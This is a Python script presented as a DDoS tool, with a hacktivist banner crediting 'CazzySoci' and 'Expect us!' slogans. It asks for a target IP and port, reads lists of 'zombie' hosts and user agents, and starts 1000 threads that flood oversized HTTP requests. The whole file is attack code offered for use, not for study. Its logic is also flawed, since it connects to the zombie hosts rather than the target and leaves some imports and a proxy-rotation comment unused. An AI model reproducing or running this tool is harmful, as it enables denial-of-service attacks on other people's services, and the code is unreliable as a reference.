import socket
import random
import threading
import socks
import time
import requests

credit = """
\033[1;36m
 ▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
 ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
 ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓
  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░
                                         ░                  ░        ░         ░ ░                       ░          
╔════════════════════════╗
║ Created by: CazzySoci  ║
║                        ║
║      𝓦𝓔𝓛𝓒𝓞𝓜𝓔           ║
║                        ║
║  We Are AnonCazzySoci  ║
║    •We don't die       ║
║    •We Multiply        ║
║    •Expect us!         ║
╚════════════════════════╝
\033[1;36m
"""


print(credit)

target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port: "))
# Read the list of zombies IPs from the txt file
zombies_list = []
with open("zombies.txt", "r") as file:
    for line in file:
        zombie_ip = line.strip()
        zombies_list.append(zombie_ip)

# Read the list of user agents from a txt file
user_agents = []
with open("ua.txt", "r") as file:
    for line in file:
        user_agents.append(line.strip())

# Number of threads for parallel attacks
num_threads = 1000

# Number of packets to send in each connection
num_packets = 1000

# Maximum payload size
payload_size = 65535

# Initialize a variable to keep track of the attack status
attack_status = False

# DDoS attack function
def ddos_attack():
    global attack_status
    while True:
        try:
            # Select a random zombie IP from the list
            zombie_ip = random.choice(zombies_list)

            # Randomly select a user agent from the list
            user_agent = random.choice(user_agents)

            # Connect to the zombie
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((zombie_ip, target_port))

            # Generate payload bytes with maximum size
            payload_bytes = b"A" * payload_size

            # Construct the HTTP request with the selected user agent and payload bytes
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
            request += payload_bytes.decode()

            # Send the attack request
            for _ in range(num_packets):
                s.sendall(request.encode())

            # Close the connection with the zombie
            s.close()

            # Set the attack status to True once the attack starts
            attack_status = True

        except Exception as e:
            # Handle any errors or connection issues
            print("Error: {}".format(str(e)))

# Start the DDoS attack threads
for _ in range(num_threads):
    t = threading.Thread(target=ddos_attack)
    t.start()

print("DDoS attack initiated!")

# Monitor the attack status
while True:
    if attack_status:
        print("Attack in progress...")
    else:
        print("No active attacks.")

    # Rotate proxies every 10 seconds
    time.sleep(10)
